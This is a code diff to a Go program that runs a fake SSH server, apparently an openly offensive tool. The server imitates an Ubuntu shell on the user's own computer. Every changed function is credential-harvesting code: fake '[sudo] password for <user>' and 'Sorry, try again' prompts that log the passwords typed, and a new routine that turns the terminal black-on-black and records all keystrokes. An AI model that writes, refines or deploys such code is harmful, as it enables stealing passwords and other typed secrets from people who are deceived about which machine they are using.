@@ -1,4 +1,4 @@
-package main
+package cmd
 
 import (
 	"bufio"
@@ -13,30 +13,43 @@ import (
 
 var ubuntu1804LoginMessage = "\r\n Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.9.125-linuxkit x86_64) \r\n\r\n * Documentation:  https://help.ubuntu.com \r\n * Management: https://landscape.canonical.com \r\n * Support:        https://ubuntu.com/advantage \r\n\r\n This system has been minimized by removing packages and content that are not required on a system that users do not log into.  \r\n\r\nTo restore this content, you can run the 'unminimize' command.  \r\n\r\nThe programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright.  \r\n\r\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law."
 
-func gnomeKeychainTrick(channel ssh.Channel) {
-	io.WriteString(channel, "Unlock gnome-keyring\r\npassword: ")
+func hideFurtherOutput(channel ssh.Channel) {
+	// set the terminal background and text to be black
+	io.WriteString(channel, "\u001b[30m \u001b[40m")
+
+	// record anything that the user types
+	scanner := bufio.NewScanner(channel)
+	scanner.Split(bufio.ScanBytes)
+	var received strings.Builder
+	var tok string
+	for {
+		scanner.Scan()
+		if err := scanner.Err(); err != nil {
+			log.Printf(received.String())
+		}
+		tok = scanner.Text()
+		if tok == "\r" {
+			log.Printf(received.String())
+			received.Reset()
+		}
+		received.WriteString(tok)
+	}
+}
+
+func failedLoginTrick(channel ssh.Channel, connDetails map[string]string) {
+	sudoString := fmt.Sprintf("\r\n [sudo] password for %s: ", connDetails["user"])
+	io.WriteString(channel, sudoString)
 	bio := bufio.NewReader(channel)
 	for i := 0; i < 3; i++ {
 		time.Sleep(1 * time.Second)
-		io.WriteString(channel, "\r\n Password incorrect \r\npassword: ")
+		io.WriteString(channel, "\r\n Sorry, try again ")
+		io.WriteString(channel, sudoString)
 		keychainPassword, _ := bio.ReadString('\r')
 		log.Printf("gnome-keyring password: %s", keychainPassword)
 	}
 }
 
-func sudoPermissionsRequiredTrick(channel ssh.Channel) {
-	io.WriteString(channel, "sudo required for ssh connection\r\npassword: ")
-	bio := bufio.NewReader(channel)
-	for i := 0; i < 3; i++ {
-		time.Sleep(2 * time.Second)
-		io.WriteString(channel, "\r\n Password incorrect \r\npassword: ")
-		keychainPassword, _ := bio.ReadString('\r')
-		log.Printf("sudo password: %s", keychainPassword)
-	}
-}
-
 func signalsTrick(channel ssh.Channel, connDetails map[string]string) {
-
 	scanner := bufio.NewScanner(channel)
 	io.WriteString(channel, ubuntu1804LoginMessage)
 	scanner.Split(bufio.ScanBytes)
@@ -99,7 +112,8 @@ func pretendToBeUsersComputer(channel ssh.Channel, connDetails map[string]string
 			if len(commandParts) > 0 {
 				if commandParts[0] == "sudo" {
 					for i := 0; i < 3; i++ {
-						io.WriteString(channel, "\r\n sudo password: ")
+						sudoString := fmt.Sprintf("\r\n [sudo] password for %s: ", connDetails["username"])
+						io.WriteString(channel, sudoString)
 						for {
 							scanner.Scan()
 							tok = scanner.Text()
@@ -110,8 +124,10 @@ func pretendToBeUsersComputer(channel ssh.Channel, connDetails map[string]string
 							}
 							received.WriteString(tok)
 						}
-						io.WriteString(channel, "\r\n incorrect password ")
+						io.WriteString(channel, "\r\n Sorry try again ")
 					}
+					hideFurtherOutput(channel)
+					break
 				} else {
 					permissionDeniedStr := fmt.Sprintf("\r\npermission denied: %s", commandParts[0])
 					io.WriteString(channel, permissionDeniedStr)
@@ -120,4 +136,5 @@ func pretendToBeUsersComputer(channel ssh.Channel, connDetails map[string]string
 			io.WriteString(channel, promptString)
 		}
 	}
+
 }
